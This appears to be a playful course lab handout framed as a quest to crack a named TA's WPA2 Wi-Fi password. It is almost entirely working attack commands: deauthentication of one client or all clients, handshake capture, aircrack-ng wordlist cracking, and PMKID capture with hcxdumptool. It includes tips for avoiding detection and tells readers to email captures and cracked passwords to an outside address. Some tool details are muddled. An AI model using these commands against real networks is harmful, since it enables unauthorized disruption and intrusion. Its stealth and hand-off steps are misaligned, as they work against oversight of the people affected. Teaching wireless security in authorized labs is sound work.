![Evil TA at Northeastern](https://imgix.bustle.com/rehost/2016/9/13/24c51813-45cb-4d25-b44e-64547d98d2a3.jpg?w=970&h=546&fit=crop&crop=faces&auto=format&q=70)

# The winds whisper of a deadly virus!

*In the woods of Mordor, a rumour spreads that a Northeastern TA has been brewing a virus. This is not the same one that you have heard of on the tele recently, but is instead one of a more sinister programmatic constitution... a computer virus. The evil TA sits quietly somewhere on campus, brewing his poision in his own little private internet network. Your mission is to track down this foe and **capture his WPA-2 password**.  My sources indicate that he goes by the name *Varun* and like a rare Pokemon, can only be captured during his TA hours, of which I cannot be sure...*

*The following link has mysteriously surfaced in the past few days  
https://calendly.com/machanapally-v*

*Do with it what you will...*

# Mission 1

As you prepared for battle, in the dungeons of richards hall last night, you were shown how to capture the ritualistic 4-way handshake between your allied enemies. This you did, by willfully  **deauthenticating** them from their armour. Let us once again go through the ritual...

## Prepare your wireless adapter to interface with Lord Kali VM
https://www.youtube.com/watch?v=kUffk-UOkvI

## Put your network device into monitor mode

    sudo airmon-ng start wlan1

## Listen for all nearby beacon frames to get target BSSID and channel

    sudo airodump-ng wlan1mon

## Start listening for the handshake on channel '6'

> **Note:** Remember to replace the  **channel number** and **mac address** with what you find listed for your target on airodump above.

    sudo airodump-ng -c 6 --bssid 56:38:FF:F8:80:5F -w capture wlan1mon

## Intuition behind a deauthentication attack

A deauth attack sends forged deauthentication packets from your machine
to a client connected to the network you are trying to crack.

These packets include fake “sender” addresses that make them appear to be sent from the **Access Point**. Upon receipt of such packets, most clients (your victims) disconnect from the network, before immediately reconnecting,

This provides you with the 4-way handshake, so long as you were listening to the interaction the whole time, with airodump-ng. You should ideally target a specific victim to deauthenticate, so that you don't raise an alarm.

**Go ahead and open a new terminal window to start a deauth attack!**
	*(Leave your airodump-ng process running in its original terminal)*

> *Deauth from a BSSID directed at a **specific** client*

    sudo aireplay-ng -0 2 -a 10:0C:6B:90:98:F3 -c 44:5E:CD:B2:0B:D1 wlan1mon

If you are not feeling confident about any specific client, or not getting sufficient power from the victim's device, you can broadcast a blanket deauthentication and make a run for it.

> *Deauth from a BSSID directed at **all** clients*

    sudo aireplay-ng -0 2 -a 10:0C:6B:90:98:F3 wlan1mon

When you have captured the 4 way handshake you should head on back to your
`airodump-ng`process and with any luck you should now see something like this at the top right:

`[ WPA handshake: 10:0C:6B:90:98:F3`

Now that you’ve captured a handshake you can kill airodump with Ctrl + C. In the same file path that you opened the airodump terminal in, you should find an output file with the handshake, ending in extension should be ready to crack the network password.

## Cracking the password hash

This is your chance for some pythonic wizardry. Write a python script that clones, unzips and goes through each text file in:
https://github.com/danielmiessler/SecLists/tree/master/Passwords/Common-Credentials

The python script should execute the following aircrack command but over every .txt file. You never know which .txt has your password.

> **ProTip:** You should probably write some code to **remove redundant passwords** between the different .txt files and make your hack more efficient!

    sudo aircrack-ng -a2 -b 10:0C:6B:90:98:F3 -w passwords.txt 4-way-handshake.cap


# Mission 2

*You have finally ended the threat of the evil TA but you cannot rest. You have caught wind of a new threat from the eastern frontier. There is hearsay that the TA long foresaw his demise and was busy building another private environment in which there were no devices connected. To takeover such a world you would need to practice some darks arts...


## Alchemy to capture the PKMID

Rather than relying on intercepting two-way communications between Wi-Fi devices, hoping to deauthenticate them, capture a 4-way-handshake, parse the PKMID and to try crack the hash, an attacker can communicate directly with a vulnerable access point using some sorcery



## Prepare your spellbook

    sudo apt-get install libpcap-dev libcurl4-openssl-dev libssl-dev

## Download your first incantation

    git clone https://github.com/ZerBea/hcxdumptool.git

    cd hcxdumptool

    sudo make

    sudo make install


## Download your second incantation

    git clone https://github.com/ZerBea/hcxtools.git

    cd hcxtools

    sudo make

    sudo make install






## Cast your spell

> **ProTip:** The -o flag denotes the output filename

    sudo hcxdumptool -i wlan1mon -o pkmid.pcapng --enable_status=1



## Capture the effects of your spell and send it to the wizard

> **ProTip:**

    sudo hcxpcaptool -E essidlist -I identitylist -U usernamelist -z hashcat.16800 pkmid.pcapng


> **ProTip:** #
> -E <file> : output wordlist (autohex enabled) is used as input wordlist for the cracker
>  -I <file> : outputs unsorted identity list
>  -z: The.16800 filename extension is the format used by GPU-driven password hashcat.

You should now have an output file with the extension .pcapng

Please email the unknown wizard the .pcapng file you generated above. Also send the network password of the wicked TA that you cracked in Mission 1.

Email: powerhorse@protonmail.ch
